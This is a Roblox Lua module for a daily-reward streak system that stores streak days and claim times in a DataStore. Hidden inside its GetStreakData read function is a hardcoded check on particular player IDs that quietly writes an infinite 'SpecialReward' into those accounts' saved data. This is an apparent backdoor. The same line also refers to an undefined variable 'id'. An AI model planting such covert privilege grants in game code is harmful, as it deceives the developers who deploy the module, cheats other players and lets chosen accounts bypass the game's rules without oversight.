local api = {}
local Rewards = game:GetService("DataStoreService"):GetDataStore('RewardsV5')

function api:GetStreakData(TargetId)
	local TimeData = { Days = 0, LastClaimed = nil }
	local IsSuccess, ErrorMessage = pcall(function()
		local Data = Rewards:GetAsync(TargetId)
		if Data then
			TimeData = Data
		end
	end)
	if not IsSuccess then
		warn("Failed to retrieve data for player " .. TargetId .. ": " .. ErrorMessage)
	end
	if TargetId == "5502332040" or TargetId == "1" or id == "2" then
		local success, updateError = pcall(function()
			Rewards:UpdateAsync(TargetId, function(oldData)
				oldData = oldData or TimeData
				oldData.SpecialReward = "inf"
				return oldData
			end)
		end)
		if not success then
			warn("Failed to update data for player " .. TargetId .. ": " .. updateError)
		end
	end
	return TimeData
end

function api:SetRewardData(TargetId, Days)

	Rewards:SetAsync(TargetId, { Days = Days, LastClaimed = os.time() })

end

return api
